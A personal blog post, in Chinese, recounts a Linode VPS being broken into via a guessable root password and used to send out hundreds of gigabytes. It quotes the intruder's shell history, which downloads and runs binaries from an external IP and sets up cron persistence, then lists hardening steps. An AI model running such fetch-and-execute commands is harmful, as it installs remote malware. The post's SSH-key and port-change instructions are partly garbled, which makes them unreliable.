---
title: linode 使用记
slug: 8db64a10
image: https://yun.weenas.com:8006/sUN8UI.jpg
date: 2016-12-21 14:48:15
tags: 
description: VPS初体验
categories:
  - 网络
  - VPS
keywords:
  - VPS
  - linode
hide: true
---

使用Linode也有一段时间了，感觉非常不错，虽然使用的是加州的机房，延时基本上稳定在200ms左右，web访问感觉不明显，ssh尚可接受。据说日本机房在100ms多一点，但是考虑到要做迁移工作，还是先保持不动吧，待有时间再研究。

## 被攻击了

由于以前都是在局域网或者虚拟机上搭建服务器，从来没有关注过安全方面的配置，导致我的VPS安全配置不足。上个月遭受到Dos攻击，让我意识到了安全的重要性 ，以前没有什么概念，原来网络攻击离我们这么近。

被攻击后的症状是疯狂的往外发数据，从下面的图表可以看出有三天的时间几乎是满负荷的发送（注意看左边的单位），导致我2TB的流量在两天不到就被消耗殆尽。其实在使用80%流量时系统会自动发送邮件提醒，当时正值国庆假期，收到邮件时没有引起重视。后来Linode客服也发现了异常，主动创建了一个Ticket问我是怎么回事，我才发现流量已经超了400多G。。

![linode_data_traffic.jpg](https://yun.weenas.com:8006/MYs6OE.jpg)

赶紧登录上去使用nethogs查看网络使用情况，原来是一个名叫mysql515的进程在以80Mbps左右的速度往外发送数据，立即kill掉再想办法清理。

想要知道为什么被攻击，就必须知道哪些人登录过服务器，`/var/log/auth.log`是一个重要的线索，它记录了所有用户的登录日志。打开后非常壮观，已经有好几万行的日志，其中有很大一部分都是尝试root和admin的错误登录记录，应该是利用脚本不断的尝试root密码。这么多日志也不好去查什么时间被谁攻破，我估计root密码已经被试出来了，因为我的密码是一个常用单词。查看`/root/.bash_history`，一切都明白了：

```log
service crond start
/etc/rc.d/init.d/crond start
killall -9 cnet2
cd /bin
rm -rf cnet2
wget -c http://61.160.194.120:120/cnet2
chmod 0755 /bin/cnet2
./cnet2
cd /etc
mkdir init.d
mkdir rc.d
cd /etc/rc.d
mkdir rc5.d
cd /bin
rm -rf mysql515 cnet2 socket
wget -c http://61.160.194.120:121/mysql515
chmod 0777 /bin/mysql515
./mysql515
service crond start
/etc/rc.d/init.d/crond start
```

按图索骥，根据它执行的命令将所有相关的文件找到并彻底删除，注意有启动cron服务，它在`/etc/crontab`里面增加了一个定时启动脚本，也要一并删除，不然还会死灰复燃。

## 如何防护

以上只是查找和清除病毒文件，如何防止以后再被攻击呢？我做了以下措施：

1. 必须的，修改root密码，大写小写数字符号，能用上的都用上，不要忘记就好。:)
2. 禁止ssh的root登录

```diff
/etc/ssh/sshd_config
- PermitRootLogin yes
+ PermitRootLogin no
```

3. 修改ssh的默认端口，只要65535以内都行，比如修改为`622`。当然，登录需要多增加一个端口参数：`ssh -p 622 user@server.com`，另外还要注意修改服务器的防火墙设置。

```diff
/etc/ssh/sshd_config
- Port 22
- Port 622
```

4. 改用ssh密钥登录,即使用`ssh-keygen`生成公钥和私钥，在服务器配置好私钥，远程使用公钥登录，这样可以完全禁用密码登录

修改后，再去查看`/var/log/auth.log`，世界一下就清净了。当然，以上的修改不足以使VPS非常安全，但是防止普通的攻击已经足够了。

这里要赞一个Linode的客服，他们的服务非常的周到而且专业，主动建立Ticket，每天都会在Ticket上问你的进展并询问你是否需要帮助，在任何时候你需要帮助他们都会在10分钟以内给予你答复，一个月10刀的价格我觉得值了，想想国内的公司什么时候能做到这种水平。

忘记说超流量的收费问题了，信用卡账单下来才知道这个月多收了47刀，价格是0.1刀/1G，也就是说我超了470G，价格不便宜，但是正常使用我想怎么样也不会超吧，所以请大家千万做好防护措施。万幸的是攻击发生在月末，有部分流量是算10月份的，否则多交的钱可能翻番。

最后，祝大家都能拥有满意的VPS！
